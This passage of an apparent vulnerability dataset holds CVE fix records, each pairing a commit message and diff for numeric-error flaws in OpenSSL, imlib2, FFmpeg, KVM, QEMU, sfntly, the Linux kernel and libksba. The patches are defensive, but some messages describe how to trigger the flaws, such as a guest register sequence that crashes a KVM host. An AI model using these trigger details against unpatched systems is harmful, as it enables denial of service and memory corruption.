have been talking about\nso far) is in the future then the injected message is bufferred to be\nhandled later, but the window is still updated. Therefore all subsequent\nlegitimate handshake records are dropped. This aspect is not considered a\nsecurity issue because there are many ways for an attacker to disrupt the\ninitial handshake and prevent it from completing successfully (e.g.\ninjection of a handshake message will cause the Finished MAC to fail and\nthe handshake to be aborted). This issue comes about as a result of trying\nto do replay protection, but having no integrity mechanism in place yet.\nDoes it even make sense to have replay protection in epoch 0? That\nissue isn't addressed here though.\n\nThis addressed an OCAP Audit issue.\n\nCVE-2016-2181\n\nReviewed-by: Richard Levitte <levitte@openssl.org>\n---\n include\/openssl\/ssl.h     |  1 +\n ssl\/record\/rec_layer_d1.c | 49 +++++++++++++++++++++++++++++++++------\n ssl\/record\/record_locl.h  |  2 +-\n ssl\/record\/ssl3_record.c  | 17 +++++++++-----\n ssl\/ssl_err.c             |  2 ++\n 5 files changed, 57 insertions(+), 14 deletions(-)\n\n","diff_code":"diff --git a\/include\/openssl\/ssl.h b\/include\/openssl\/ssl.h\nindex a7732ff512..4f23c9f804 100644\n--- a\/include\/openssl\/ssl.h\n+++ b\/include\/openssl\/ssl.h\n@@ -2066,6 +2066,7 @@ int ERR_load_SSL_strings(void);\n # define SSL_F_DTLS1_CHECK_TIMEOUT_NUM                    318\n # define SSL_F_DTLS1_HEARTBEAT                            305\n # define SSL_F_DTLS1_PREPROCESS_FRAGMENT                  288\n+# define SSL_F_DTLS1_PROCESS_BUFFERED_RECORDS             423\n # define SSL_F_DTLS1_PROCESS_RECORD                       257\n # define SSL_F_DTLS1_READ_BYTES                           258\n # define SSL_F_DTLS1_READ_FAILED                          339\ndiff --git a\/ssl\/record\/rec_layer_d1.c b\/ssl\/record\/rec_layer_d1.c\nindex 0f7881ecd0..be6aac719f 100644\n--- a\/ssl\/record\/rec_layer_d1.c\n+++ b\/ssl\/record\/rec_layer_d1.c\n@@ -230,12 +230,18 @@ int dtls1_process_buffered_records(SSL *s)\n {\n     pitem *item;\n     SSL3_BUFFER *rb;\n+    SSL3_RECORD *rr;\n+    DTLS1_BITMAP *bitmap;\n+    unsigned int is_next_epoch;\n+    int replayok = 1;\n \n     item = pqueue_peek(s->rlayer.d->unprocessed_rcds.q);\n     if (item) {\n         \/* Check if epoch is current. *\/\n         if (s->rlayer.d->unprocessed_rcds.epoch != s->rlayer.d->r_epoch)\n-            return (1);         \/* Nothing to do. *\/\n+            return 1;         \/* Nothing to do. *\/\n+\n+        rr = RECORD_LAYER_get_rrec(&s->rlayer);\n \n         rb = RECORD_LAYER_get_rbuf(&s->rlayer);\n \n@@ -252,12 +258,41 @@ int dtls1_process_buffered_records(SSL *s)\n         \/* Process all the records. *\/\n         while (pqueue_peek(s->rlayer.d->unprocessed_rcds.q)) {\n             dtls1_get_unprocessed_record(s);\n-            if (!dtls1_process_record(s))\n-                return (0);\n+            bitmap = dtls1_get_bitmap(s, rr, &is_next_epoch);\n+            if (bitmap == NULL) {\n+                \/*\n+                 * Should not happen. This will only ever be NULL when the\n+                 * current record is from a different epoch. But that cannot\n+                 * be the case because we already checked the epoch above\n+                 *\/\n+                 SSLerr(SSL_F_DTLS1_PROCESS_BUFFERED_RECORDS,\n+                        ERR_R_INTERNAL_ERROR);\n+                 return 0;\n+            }\n+#ifndef OPENSSL_NO_SCTP\n+            \/* Only do replay check if no SCTP bio *\/\n+            if (!BIO_dgram_is_sctp(SSL_get_rbio(s)))\n+#endif\n+            {\n+                \/*\n+                 * Check whether this is a repeat, or aged record. We did this\n+                 * check once already when we first received the record - but\n+                 * we might have updated the window since then due to\n+                 * records we subsequently processed.\n+                 *\/\n+                replayok = dtls1_record_replay_check(s, bitmap);\n+            }\n+\n+            if (!replayok || !dtls1_process_record(s, bitmap)) {\n+                \/* dump this record *\/\n+                rr->length = 0;\n+                RECORD_LAYER_reset_packet_length(&s->rlayer);\n+                continue;\n+            }\n+\n             if (dtls1_buffer_record(s, &(s->rlayer.d->processed_rcds),\n-                                    SSL3_RECORD_get_seq_num(s->rlayer.rrec)) <\n-                0)\n-                return -1;\n+                    SSL3_RECORD_get_seq_num(s->rlayer.rrec)) < 0)\n+                return 0;\n         }\n     }\n \n@@ -268,7 +303,7 @@ int dtls1_process_buffered_records(SSL *s)\n     s->rlayer.d->processed_rcds.epoch = s->rlayer.d->r_epoch;\n     s->rlayer.d->unprocessed_rcds.epoch = s->rlayer.d->r_epoch + 1;\n \n-    return (1);\n+    return 1;\n }\n \n \/*-\ndiff --git a\/ssl\/record\/record_locl.h b\/ssl\/record\/record_locl.h\nindex 3b9a700d9f..52e59e46d5 100644\n--- a\/ssl\/record\/record_locl.h\n+++ b\/ssl\/record\/record_locl.h\n@@ -110,5 +110,5 @@ __owur int ssl3_cbc_remove_padding(SSL3_RECORD *rec,\n __owur int tls1_cbc_remove_padding(const SSL *s,\n                                    SSL3_RECORD *rec,\n                                    unsigned block_size, unsigned mac_size);\n-int dtls1_process_record(SSL *s);\n+int dtls1_process_record(SSL *s, DTLS1_BITMAP *bitmap);\n __owur int dtls1_get_record(SSL *s);\ndiff --git a\/ssl\/record\/ssl3_record.c b\/ssl\/record\/ssl3_record.c\nindex c99d5e4416..32a97aff08 100644\n--- a\/ssl\/record\/ssl3_record.c\n+++ b\/ssl\/record\/ssl3_record.c\n@@ -1273,7 +1273,7 @@ void ssl3_cbc_copy_mac(unsigned char *out,\n #endif\n }\n \n-int dtls1_process_record(SSL *s)\n+int dtls1_process_record(SSL *s, DTLS1_BITMAP *bitmap)\n {\n     int i, al;\n     int enc_err;\n@@ -1429,6 +1429,10 @@ int dtls1_process_record(SSL *s)\n \n     \/* we have pulled in a full packet so zero things *\/\n     RECORD_LAYER_reset_packet_length(&s->rlayer);\n+\n+    \/* Mark receipt of record. *\/\n+    dtls1_record_bitmap_update(s, bitmap);\n+\n     return (1);\n \n  f_err:\n@@ -1472,7 +1476,7 @@ int dtls1_get_record(SSL *s)\n      * The epoch may have changed.  If so, process all the pending records.\n      * This is a non-blocking operation.\n      *\/\n-    if (dtls1_process_buffered_records(s) < 0)\n+    if (!dtls1_process_buffered_records(s))\n         return -1;\n \n     \/* if we're renegotiating, then there may be buffered records *\/\n@@ -1580,6 +1584,10 @@ int dtls1_get_record(SSL *s)\n     if (!BIO_dgram_is_sctp(SSL_get_rbio(s))) {\n #endif\n         \/* Check whether this is a repeat, or aged record. *\/\n+        \/*\n+         * TODO: Does it make sense to have replay protection in epoch 0 where\n+         * we have no integrity negotiated yet?\n+         *\/\n         if (!dtls1_record_replay_check(s, bitmap)) {\n             rr->length = 0;\n             RECORD_LAYER_reset_packet_length(&s->rlayer); \/* dump this record *\/\n@@ -1604,20 +1612,17 @@ int dtls1_get_record(SSL *s)\n                 (s, &(DTLS_RECORD_LAYER_get_unprocessed_rcds(&s->rlayer)),\n                  rr->seq_num) < 0)\n                 return -1;\n-            \/* Mark receipt of record. *\/\n-            dtls1_record_bitmap_update(s, bitmap);\n         }\n         rr->length = 0;\n         RECORD_LAYER_reset_packet_length(&s->rlayer);\n         goto again;\n     }\n \n-    if (!dtls1_process_record(s)) {\n+    if (!dtls1_process_record(s, bitmap)) {\n         rr->length = 0;\n         RECORD_LAYER_reset_packet_length(&s->rlayer); \/* dump this record *\/\n         goto again;             \/* get another record *\/\n     }\n-    dtls1_record_bitmap_update(s, bitmap); \/* Mark receipt of record. *\/\n \n     return (1);\n \ndiff --git a\/ssl\/ssl_err.c b\/ssl\/ssl_err.c\nindex 9644fd2466..1fddda612a 100644\n--- a\/ssl\/ssl_err.c\n+++ b\/ssl\/ssl_err.c\n@@ -32,6 +32,8 @@ static ERR_STRING_DATA SSL_str_functs[] = {\n     {ERR_FUNC(SSL_F_DTLS1_CHECK_TIMEOUT_NUM), \"dtls1_check_timeout_num\"},\n     {ERR_FUNC(SSL_F_DTLS1_HEARTBEAT), \"dtls1_heartbeat\"},\n     {ERR_FUNC(SSL_F_DTLS1_PREPROCESS_FRAGMENT), \"dtls1_preprocess_fragment\"},\n+    {ERR_FUNC(SSL_F_DTLS1_PROCESS_BUFFERED_RECORDS),\n+     \"dtls1_process_buffered_records\"},\n     {ERR_FUNC(SSL_F_DTLS1_PROCESS_RECORD), \"dtls1_process_record\"},\n     {ERR_FUNC(SSL_F_DTLS1_READ_BYTES), \"dtls1_read_bytes\"},\n     {ERR_FUNC(SSL_F_DTLS1_READ_FAILED), \"dtls1_read_failed\"},\n-- \n2.17.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-5326","CWE_ID":"189","category":"security","commit_id":"c94d83ccab15d5ef02f88d42dce38ed3f0892882","commit_message":"From c94d83ccab15d5ef02f88d42dce38ed3f0892882 Mon Sep 17 00:00:00 2001\nFrom: Kim Woelders <kim@woelders.dk>\nDate: Wed, 6 Apr 2016 17:42:17 +0200\nSubject: Fix potential divide-by-zero in imlib_image_draw_ellipse().\n\nAttempting to draw a 2x1 ellipse with e.g. imlib_image_draw_ellipse(x, y, 2, 1)\ncauses a divide-by-zero.\nIt seems happy enough to draw 1x1, 1x2 and 2x2, but not 2x1.\n\nPatch by Simon Lees.\n\nhttps:\/\/bugs.debian.org\/639414\n---\n src\/lib\/ellipse.c | 24 ++++++++++++++++++++++++\n 1 file changed, 24 insertions(+)\n\n","diff_code":"diff --git a\/src\/lib\/ellipse.c b\/src\/lib\/ellipse.c\nindex cd90268..ddb410b 100644\n--- a\/src\/lib\/ellipse.c\n+++ b\/src\/lib\/ellipse.c\n@@ -71,6 +71,9 @@ __imlib_Ellipse_DrawToData(int xc, int yc, int a, int b, DATA32 color,\n         if (IN_RANGE(rx, by, clw, clh))\n            pfunc(color, bp + len);\n \n+        if (dx < 1)\n+           dx = 1;\n+\n         dy += b2;\n         yy -= ((dy << 16) \/ dx);\n         lx--;\n@@ -123,6 +126,9 @@ __imlib_Ellipse_DrawToData(int xc, int yc, int a, int b, DATA32 color,\n         if (IN_RANGE(rx, by, clw, clh))\n            pfunc(color, bp + len);\n \n+        if (dy < 1)\n+           dy = 1;\n+\n         dx -= a2;\n         xx += ((dx << 16) \/ dy);\n         ty++;\n@@ -222,6 +228,9 @@ __imlib_Ellipse_DrawToData_AA(int xc, int yc, int a, int b, DATA32 color,\n         if (IN_RANGE(rx, by, clw, clh))\n            pfunc(col1, bp + len);\n \n+        if (dx < 1)\n+           dx = 1;\n+\n         dy += b2;\n         yy -= ((dy << 16) \/ dx);\n         lx--;\n@@ -295,6 +304,9 @@ __imlib_Ellipse_DrawToData_AA(int xc, int yc, int a, int b, DATA32 color,\n         if (IN_RANGE(rx, by, clw, clh))\n            pfunc(col1, bp + len);\n \n+        if (dy < 1)\n+           dy = 1;\n+\n         dx -= a2;\n         xx += ((dx << 16) \/ dy);\n         ty++;\n@@ -395,6 +407,9 @@ __imlib_Ellipse_FillToData(int xc, int yc, int a, int b, DATA32 color,\n         if (IN_RANGE(rx, by, clw, clh))\n            pfunc(color, bp + len);\n \n+        if (dx < 1)\n+           dx = 1;\n+\n         dy += b2;\n         yy -= ((dy << 16) \/ dx);\n         lx--;\n@@ -453,6 +468,9 @@ __imlib_Ellipse_FillToData(int xc, int yc, int a, int b, DATA32 color,\n         if (((unsigned)by < (unsigned)clh) && (len > 0))\n            sfunc(color, bpp, len);\n \n+        if (dy < 1)\n+           dy = 1;\n+\n         dx -= a2;\n         xx += ((dx << 16) \/ dy);\n         ty++;\n@@ -556,6 +574,9 @@ __imlib_Ellipse_FillToData_AA(int xc, int yc, int a, int b, DATA32 color,\n         if (IN_RANGE(rx, by, clw, clh))\n            pfunc(col1, bp + len);\n \n+        if (dx < 1)\n+           dx = 1;\n+\n         dy += b2;\n         yy -= ((dy << 16) \/ dx);\n         lx--;\n@@ -629,6 +650,9 @@ __imlib_Ellipse_FillToData_AA(int xc, int yc, int a, int b, DATA32 color,\n         if (IN_RANGE(rx, by, clw, clh))\n            pfunc(col1, bp + len);\n \n+        if (dy < 1)\n+           dy = 1;\n+\n         dx -= a2;\n         xx += ((dx << 16) \/ dy);\n         ty++;\n-- \ncgit v1.2.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-2099","CWE_ID":"189","category":"security","commit_id":"c919e1ca2ecfc47d796382973ba0e48b8f6f92a2","commit_message":"From c919e1ca2ecfc47d796382973ba0e48b8f6f92a2 Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Sun, 16 Feb 2014 23:08:52 +0100\nSubject: [PATCH] avcodec\/msrle: use av_image_get_linesize() to calculate the\n linesize\n\nFixes out of array access\nFixes: 14a74a0a2dc67ede543f0e35d834fbbe-asan_heap-oob_49572c_556_cov_215466444_44_001_engine_room.mov\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/msrle.c | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/libavcodec\/msrle.c b\/libavcodec\/msrle.c\nindex 7ae4b08ba6..ad04ce8984 100644\n--- a\/libavcodec\/msrle.c\n+++ b\/libavcodec\/msrle.c\n@@ -35,6 +35,7 @@\n #include \"avcodec.h\"\n #include \"internal.h\"\n #include \"msrledec.h\"\n+#include \"libavutil\/imgutils.h\"\n \n typedef struct MsrleContext {\n     AVCodecContext *avctx;\n@@ -110,7 +111,7 @@ static int msrle_decode_frame(AVCodecContext *avctx,\n \n     \/* FIXME how to correctly detect RLE ??? *\/\n     if (avctx->height * istride == avpkt->size) { \/* assume uncompressed *\/\n-        int linesize = (avctx->width * avctx->bits_per_coded_sample + 7) \/ 8;\n+        int linesize = av_image_get_linesize(avctx->pix_fmt, avctx->width, 0);\n         uint8_t *ptr = s->frame->data[0];\n         uint8_t *buf = avpkt->data + (avctx->height-1)*istride;\n         int i, j;\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-6367","CWE_ID":"189","category":"security","commit_id":"b963a22e6d1a266a67e9eecc88134713fd54775c","commit_message":"From b963a22e6d1a266a67e9eecc88134713fd54775c Mon Sep 17 00:00:00 2001\nFrom: Andy Honig <ahonig@google.com>\nDate: Tue, 19 Nov 2013 14:12:18 -0800\nSubject: [PATCH] KVM: x86: Fix potential divide by 0 in lapic (CVE-2013-6367)\n\nUnder guest controllable circumstances apic_get_tmcct will execute a\ndivide by zero and cause a crash.  If the guest cpuid support\ntsc deadline timers and performs the following sequence of requests\nthe host will crash.\n- Set the mode to periodic\n- Set the TMICT to 0\n- Set the mode bits to 11 (neither periodic, nor one shot, nor tsc deadline)\n- Set the TMICT to non-zero.\nThen the lapic_timer.period will be 0, but the TMICT will not be.  If the\nguest then reads from the TMCCT then the host will perform a divide by 0.\n\nThis patch ensures that if the lapic_timer.period is 0, then the division\ndoes not occur.\n\nReported-by: Andrew Honig <ahonig@google.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Andrew Honig <ahonig@google.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\n---\n arch\/x86\/kvm\/lapic.c | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/arch\/x86\/kvm\/lapic.c b\/arch\/x86\/kvm\/lapic.c\nindex 5439117d5c4cc..89b52ec7d09c5 100644\n--- a\/arch\/x86\/kvm\/lapic.c\n+++ b\/arch\/x86\/kvm\/lapic.c\n@@ -841,7 +841,8 @@ static u32 apic_get_tmcct(struct kvm_lapic *apic)\n \tASSERT(apic != NULL);\n \n \t\/* if initial count is 0, current count should also be 0 *\/\n-\tif (kvm_apic_get_reg(apic, APIC_TMICT) == 0)\n+\tif (kvm_apic_get_reg(apic, APIC_TMICT) == 0 ||\n+\t\tapic->lapic_timer.period == 0)\n \t\treturn 0;\n \n \tremaining = hrtimer_get_remaining(&apic->lapic_timer.timer);\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2016-2538","CWE_ID":"189","category":"security","commit_id":"fe3c546c5ff2a6210f9a4d8561cc64051ca8603e","commit_message":"From fe3c546c5ff2a6210f9a4d8561cc64051ca8603e Mon Sep 17 00:00:00 2001\nFrom: Prasad J Pandit <pjp@fedoraproject.org>\nDate: Wed, 17 Feb 2016 00:23:41 +0530\nSubject: [PATCH] usb: check RNDIS buffer offsets & length\n\nWhen processing remote NDIS control message packets,\nthe USB Net device emulator uses a fixed length(4096) data buffer.\nThe incoming informationBufferOffset & Length combination could\noverflow and cross that range. Check control message buffer\noffsets and length to avoid it.\n\nReported-by: Qinghao Tang <luodalongde@gmail.com>\nSigned-off-by: Prasad J Pandit <pjp@fedoraproject.org>\nMessage-id: 1455648821-17340-3-git-send-email-ppandit@redhat.com\nSigned-off-by: Gerd Hoffmann <kraxel@redhat.com>\n---\n hw\/usb\/dev-network.c | 9 ++++++---\n 1 file changed, 6 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/hw\/usb\/dev-network.c b\/hw\/usb\/dev-network.c\nindex 5dc4538..c6abd38 100644\n--- a\/hw\/usb\/dev-network.c\n+++ b\/hw\/usb\/dev-network.c\n@@ -916,8 +916,9 @@ static int rndis_query_response(USBNetState *s,\n \n     bufoffs = le32_to_cpu(buf->InformationBufferOffset) + 8;\n     buflen = le32_to_cpu(buf->InformationBufferLength);\n-    if (bufoffs + buflen > length)\n+    if (buflen > length || bufoffs >= length || bufoffs + buflen > length) {\n         return USB_RET_STALL;\n+    }\n \n     infobuflen = ndis_query(s, le32_to_cpu(buf->OID),\n                             bufoffs + (uint8_t *) buf, buflen, infobuf,\n@@ -962,8 +963,9 @@ static int rndis_set_response(USBNetState *s,\n \n     bufoffs = le32_to_cpu(buf->InformationBufferOffset) + 8;\n     buflen = le32_to_cpu(buf->InformationBufferLength);\n-    if (bufoffs + buflen > length)\n+    if (buflen > length || bufoffs >= length || bufoffs + buflen > length) {\n         return USB_RET_STALL;\n+    }\n \n     ret = ndis_set(s, le32_to_cpu(buf->OID),\n                     bufoffs + (uint8_t *) buf, buflen);\n@@ -1213,8 +1215,9 @@ static void usb_net_handle_dataout(USBNetState *s, USBPacket *p)\n     if (le32_to_cpu(msg->MessageType) == RNDIS_PACKET_MSG) {\n         uint32_t offs = 8 + le32_to_cpu(msg->DataOffset);\n         uint32_t size = le32_to_cpu(msg->DataLength);\n-        if (offs + size <= len)\n+        if (offs < len && size < len && offs + size <= len) {\n             qemu_send_packet(qemu_get_queue(s->nic), s->out_buf + offs, size);\n+        }\n     }\n     s->out_ptr -= len;\n     memmove(s->out_buf, &s->out_buf[len], s->out_ptr);\n-- \n1.8.3.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2015-6781","CWE_ID":"189","category":"security","commit_id":"de776d4ef06ca29c240de3444348894f032b03ff","commit_message":"From de776d4ef06ca29c240de3444348894f032b03ff Mon Sep 17 00:00:00 2001\nFrom: Lei Zhang <leizleiz@users.noreply.github.com>\nDate: Wed, 23 Sep 2015 16:06:28 -0700\nSubject: [PATCH] Check for integer overflow in sfntly::FontData::Bound().\n\nAlso delete dead code and cleanup some nits.\n\nThis is cl\/96914065.\n---\n cpp\/src\/sfntly\/data\/font_data.cc | 44 ++++++++++++++++++++------------\n cpp\/src\/sfntly\/data\/font_data.h  | 15 ++---------\n cpp\/src\/sfntly\/port\/logging.h    | 31 ++++++++++++++++++++++\n 3 files changed, 60 insertions(+), 30 deletions(-)\n create mode 100644 cpp\/src\/sfntly\/port\/logging.h\n\n","diff_code":"diff --git a\/cpp\/src\/sfntly\/data\/font_data.cc b\/cpp\/src\/sfntly\/data\/font_data.cc\nindex d2b95eac..95bee3e9 100644\n--- a\/cpp\/src\/sfntly\/data\/font_data.cc\n+++ b\/cpp\/src\/sfntly\/data\/font_data.cc\n@@ -14,11 +14,13 @@\n  * limitations under the License.\n  *\/\n \n-#include <limits.h>\n+#include \"sfntly\/data\/font_data.h\"\n+\n #include <algorithm>\n #include <functional>\n+#include <limits>\n \n-#include \"sfntly\/data\/font_data.h\"\n+#include \"sfntly\/port\/logging.h\"\n \n namespace sfntly {\n \n@@ -26,21 +28,29 @@ int32_t FontData::Size() const {\n   return std::min<int32_t>(array_->Size() - bound_offset_, bound_length_);\n }\n \n-bool FontData::Bound(int32_t offset, int32_t length) {\n-  if (offset + length > Size() || offset < 0 || length < 0)\n-    return false;\n-\n-  bound_offset_ += offset;\n+void FontData::Bound(int32_t offset, int32_t length) {\n+  \/\/ Inputs should not be negative.\n+  CHECK(offset >= 0);\n+  CHECK(length >= 0);\n+\n+  \/\/ Check to make sure |bound_offset_| will not overflow.\n+  CHECK(bound_offset_ <= std::numeric_limits<int32_t>::max() - offset);\n+  const int32_t new_offset = bound_offset_ + offset;\n+\n+  if (length == GROWABLE_SIZE) {\n+    \/\/ When |length| has the special value of GROWABLE_SIZE, it means the size\n+    \/\/ should not have any artificial limits, thus it is just the underlying\n+    \/\/ |array_|'s size. Just make sure |new_offset| is still within bounds.\n+    CHECK(new_offset <= array_->Size());\n+  } else {\n+    \/\/ When |length| has any other value, |new_offset| + |length| points to the\n+    \/\/ end of the array. Make sure that is within bounds, but use subtraction to\n+    \/\/ avoid an integer overflow.\n+    CHECK(new_offset <= array_->Size() - length);\n+  }\n+\n+  bound_offset_ = new_offset;\n   bound_length_ = length;\n-  return true;\n-}\n-\n-bool FontData::Bound(int32_t offset) {\n-if (offset > Size() || offset < 0)\n-    return false;\n-\n-  bound_offset_ += offset;\n-  return true;\n }\n \n int32_t FontData::Length() const {\n@@ -60,7 +70,7 @@ FontData::FontData(FontData* data, int32_t offset) {\n   Init(data->array_);\n   Bound(data->bound_offset_ + offset,\n         (data->bound_length_ == GROWABLE_SIZE)\n-            ? GROWABLE_SIZE : data->bound_length_ - offset);\n+        ? GROWABLE_SIZE : data->bound_length_ - offset);\n }\n \n FontData::~FontData() {}\ndiff --git a\/cpp\/src\/sfntly\/data\/font_data.h b\/cpp\/src\/sfntly\/data\/font_data.h\nindex d02e8b75..e0e7e799 100644\n--- a\/cpp\/src\/sfntly\/data\/font_data.h\n+++ b\/cpp\/src\/sfntly\/data\/font_data.h\n@@ -19,11 +19,9 @@\n \n #include <limits.h>\n \n-#include <vector>\n-\n-#include \"sfntly\/port\/type.h\"\n #include \"sfntly\/data\/byte_array.h\"\n #include \"sfntly\/port\/refcount.h\"\n+#include \"sfntly\/port\/type.h\"\n \n namespace sfntly {\n \n@@ -60,16 +58,7 @@ class FontData : virtual public RefCount {\n   \/\/ visible within the bounds set.\n   \/\/ @param offset the start of the new bounds\n   \/\/ @param length the number of bytes in the bounded array\n-  \/\/ @return true if the bounding range was successful; false otherwise\n-  virtual bool Bound(int32_t offset, int32_t length);\n-\n-  \/\/ Sets limits on the size of the FontData. This is a offset bound only so if\n-  \/\/ the FontData is writable and growable then there is no limit to that growth\n-  \/\/ from the bounding operation.\n-  \/\/ @param offset the start of the new bounds which must be within the current\n-  \/\/        size of the FontData\n-  \/\/ @return true if the bounding range was successful; false otherwise\n-  virtual bool Bound(int32_t offset);\n+  virtual void Bound(int32_t offset, int32_t length);\n \n   \/\/ Makes a slice of this FontData. The returned slice will share the data with\n   \/\/ the original <code>FontData<\/code>.\ndiff --git a\/cpp\/src\/sfntly\/port\/logging.h b\/cpp\/src\/sfntly\/port\/logging.h\nnew file mode 100644\nindex 00000000..1d9e3195\n--- \/dev\/null\n+++ b\/cpp\/src\/sfntly\/port\/logging.h\n@@ -0,0 +1,31 @@\n+\/*\n+ * Copyright 2015 Google Inc. All Rights Reserved.\n+ *\n+ * Licensed under the Apache License, Version 2.0 (the \"License\");\n+ * you may not use this file except in compliance with the License.\n+ * You may obtain a copy of the License at\n+ *\n+ *      http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ *\/\n+\n+#ifndef SFNTLY_CPP_SRC_SFNTLY_PORT_LOGGING_H_\n+#define SFNTLY_CPP_SRC_SFNTLY_PORT_LOGGING_H_\n+\n+#include <stdio.h>\n+#include <stdlib.h>\n+\n+\/\/ Cheap base\/logging.h knock off.\n+\n+#define CHECK(expr) \\\n+    if (!(expr)) { \\\n+      printf(\"CHECK failed\\n\"); \\\n+      abort(); \\\n+    }\n+\n+#endif  \/\/ SFNTLY_CPP_SRC_SFNTLY_PORT_LOGGING_H_\n","owner":"googlei18n","repo":"sfntly","source":"cve"},{"CVE_ID":"CVE-2011-1593","CWE_ID":"189","category":"security","commit_id":"d8bdc59f215e62098bc5b4256fd9928bf27053a1","commit_message":"From d8bdc59f215e62098bc5b4256fd9928bf27053a1 Mon Sep 17 00:00:00 2001\nFrom: Linus Torvalds <torvalds@linux-foundation.org>\nDate: Mon, 18 Apr 2011 10:36:54 -0700\nSubject: proc: do proper range check on readdir offset\n\nRather than pass in some random truncated offset to the pid-related\nfunctions, check that the offset is in range up-front.\n\nThis is just cleanup, the previous commit fixed the real problem.\n\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n fs\/proc\/base.c | 9 +++++++--\n 1 file changed, 7 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/fs\/proc\/base.c b\/fs\/proc\/base.c\nindex dd6628d3ba42..dfa532730e55 100644\n--- a\/fs\/proc\/base.c\n+++ b\/fs\/proc\/base.c\n@@ -3124,11 +3124,16 @@ static int proc_pid_fill_cache(struct file *filp, void *dirent, filldir_t filldi\n \/* for the \/proc\/ directory itself, after non-process stuff has been done *\/\n int proc_pid_readdir(struct file * filp, void * dirent, filldir_t filldir)\n {\n-\tunsigned int nr = filp->f_pos - FIRST_PROCESS_ENTRY;\n-\tstruct task_struct *reaper = get_proc_task(filp->f_path.dentry->d_inode);\n+\tunsigned int nr;\n+\tstruct task_struct *reaper;\n \tstruct tgid_iter iter;\n \tstruct pid_namespace *ns;\n \n+\tif (filp->f_pos >= PID_MAX_LIMIT + TGID_OFFSET)\n+\t\tgoto out_no_task;\n+\tnr = filp->f_pos - FIRST_PROCESS_ENTRY;\n+\n+\treaper = get_proc_task(filp->f_path.dentry->d_inode);\n \tif (!reaper)\n \t\tgoto out_no_task;\n \n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"stoth68000","repo":"media-tree","source":"cve"},{"CVE_ID":"CVE-2011-1747","CWE_ID":"189","category":"security","commit_id":"b522f02184b413955f3bc952e3776ce41edc6355","commit_message":"From b522f02184b413955f3bc952e3776ce41edc6355 Mon Sep 17 00:00:00 2001\nFrom: Vasiliy Kulikov <segoon@openwall.com>\nDate: Thu, 14 Apr 2011 20:55:19 +0400\nSubject: agp: fix OOM and buffer overflow\n\npage_count is copied from userspace.  agp_allocate_memory() tries to\ncheck whether this number is too big, but doesn't take into account the\nwrap case.  Also agp_create_user_memory() doesn't check whether\nalloc_size is calculated from num_agp_pages variable without overflow.\nThis may lead to allocation of too small buffer with following buffer\noverflow.\n\nAnother problem in agp code is not addressed in the patch - kernel memory\nexhaustion (AGPIOC_RESERVE and AGPIOC_ALLOCATE ioctls).  It is not checked\nwhether requested pid is a pid of the caller (no check in agpioc_reserve_wrap()).\nEach allocation is limited to 16KB, though, there is no per-process limit.\nThis might lead to OOM situation, which is not even solved in case of the\ncaller death by OOM killer - the memory is allocated for another (faked) process.\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com>\nSigned-off-by: Dave Airlie <airlied@redhat.com>\n---\n drivers\/char\/agp\/generic.c | 8 +++++++-\n 1 file changed, 7 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/drivers\/char\/agp\/generic.c b\/drivers\/char\/agp\/generic.c\nindex 012cba0d6d96..850a643ad694 100644\n--- a\/drivers\/char\/agp\/generic.c\n+++ b\/drivers\/char\/agp\/generic.c\n@@ -115,6 +115,9 @@ static struct agp_memory *agp_create_user_memory(unsigned long num_agp_pages)\n \tstruct agp_memory *new;\n \tunsigned long alloc_size = num_agp_pages*sizeof(struct page *);\n \n+\tif (INT_MAX\/sizeof(struct page *) < num_agp_pages)\n+\t\treturn NULL;\n+\n \tnew = kzalloc(sizeof(struct agp_memory), GFP_KERNEL);\n \tif (new == NULL)\n \t\treturn NULL;\n@@ -234,11 +237,14 @@ struct agp_memory *agp_allocate_memory(struct agp_bridge_data *bridge,\n \tint scratch_pages;\n \tstruct agp_memory *new;\n \tsize_t i;\n+\tint cur_memory;\n \n \tif (!bridge)\n \t\treturn NULL;\n \n-\tif ((atomic_read(&bridge->current_memory_agp) + page_count) > bridge->max_memory_agp)\n+\tcur_memory = atomic_read(&bridge->current_memory_agp);\n+\tif ((cur_memory + page_count > bridge->max_memory_agp) ||\n+\t    (cur_memory + page_count < page_count))\n \t\treturn NULL;\n \n \tif (type >= AGP_USER_TYPES) {\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2016-4574","CWE_ID":"189","category":"security","commit_id":"6be61daac047d8e6aa941eb103f8e71a1d4e3c75","commit_message":"From 6be61daac047d8e6aa941eb103f8e71a1d4e3c75 Mon Sep 17 00:00:00 2001\nFrom: Werner Koch <wk@gnupg.org>\nDate: Tue, 3 May 2016 16:01:09 +0200\nSubject: [PATCH] Fix an OOB read access in _ksba_dn_to_str.\n\n* src\/dn.c (append_utf8_value): Use a straightforward check to fix an\noff-by-one.\n--\n\nThe old fix for the problem from April 2015 had an off-by-one in the\nbad encoding handing.\n\nFixes-commit: 